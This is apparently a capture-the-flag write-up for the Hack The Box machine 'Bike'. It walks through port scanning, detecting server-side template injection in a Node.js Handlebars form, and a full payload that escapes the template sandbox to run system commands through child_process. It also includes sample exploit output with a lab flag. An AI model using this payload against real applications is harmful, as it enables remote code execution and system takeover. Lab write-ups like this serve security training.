# HTB Bike - SSTI Exploit Write-up

![Bike Logo](https://infosec-db.github.io/CyberDepot/assets/htb-bike.png)

## Overview
**HTB Bike** is a *Hack The Box* machine that involves exploiting a **Server-Side Template Injection (SSTI)** vulnerability in a **Node.js Handlebars template engine**. This write-up walks through the exploitation process and provides a fully automated **SQLmap-styled** exploit.

---

## Enumeration

### **🔍 Nmap Scan**
We start by scanning the target with **Nmap**:

```bash
nmap -sC -sV -p- 10.129.6.196
```

This reveals:
- **Port 22 (SSH)** - Ignored (no creds available).
- **Port 80 (HTTP)** - Running an **Express.js** server.

### **🔍 Identifying SSTI**
When interacting with the email subscription form on the web page, our input is reflected back:

```html
We will contact you at: <input>
```

We test for **Server-Side Template Injection (SSTI)** using:

```bash
curl -X POST http://10.129.6.196/ -d "email={{7*7}}"
```

If the response contains `49`, **the site is vulnerable!** ✅

---

## Exploitation

### **🔗 Exploit Payload**
Using **Handlebars SSTI**, we craft a payload that executes system commands:

```handlebars
{{#with "s" as |string|}}
{{#with "e"}}
{{#with split as |conslist|}}
{{this.pop}}
{{this.push (lookup string.sub "constructor")}}
{{this.pop}}
{{#with string.split as |codelist|}}
{{this.pop}}
{{this.push "return process.mainModule.require('child_process').execSync('whoami').toString();"}}
{{this.pop}}
{{#each conslist}}
{{#with (string.sub.apply 0 codelist)}}
{{this}}
{{/with}}
{{/each}}
{{/with}}
{{/with}}
{{/with}}
{{/with}}
```

This **bypasses sandboxing** and allows **Remote Code Execution (RCE)**!

---

## 🚀 Automating the Exploit

We use a **fully automated Python script** with:
✅ **SQLmap-style output**  
✅ **Fancy ASCII banner**  
✅ **JSON debugging for failed extractions**  

```bash
python3 bike_exploit.py
```

### **Example Output**
```plaintext
[12:00:00] [INFO] Starting SSTI Exploit for Bike HTB Machine
[12:00:01] [SUCCESS] SSTI vulnerability detected!
[12:00:02] [INFO] Checking user privileges...
[12:00:02] [SUCCESS] Running as: root
[12:00:03] [INFO] Fetching flag...
[12:00:04] [SUCCESS] Flag: 6b258d726d287462d60c103d0142a81c
```

---

## 📜 Conclusion
This challenge demonstrates **how dangerous SSTI can be**, especially in **Node.js-based applications**. The exploit works by **breaking out of the Handlebars sandbox** and gaining **full system control**.

---
🛠️ **Credits:**  
💀 Developed by **#AfterDark**  
🔗 [CyberDepot](https://infosec-db.github.io/CyberDepot/) - More Exploits & Writeups
